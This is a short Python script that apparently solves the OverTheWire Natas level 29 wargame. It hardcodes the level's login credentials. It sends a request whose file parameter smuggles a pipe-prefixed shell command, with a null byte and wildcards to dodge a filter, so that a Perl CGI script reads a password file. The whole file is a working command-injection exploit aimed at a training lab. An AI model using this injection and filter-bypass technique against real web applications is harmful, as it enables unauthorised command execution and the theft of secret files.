import requests
from urllib.parse import quote

url = "http://natas29.natas.labs.overthewire.org"
auth = ("natas29","31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns")

session = requests.Session()

session.auth = auth

command = "cat /etc/na*as_webpass/na*as29"

file = "|" + command+ "\0"


url = url + "/index.pl?file=" + quote(file)

print(url)

response = session.get(url)

print(response.text[:4500])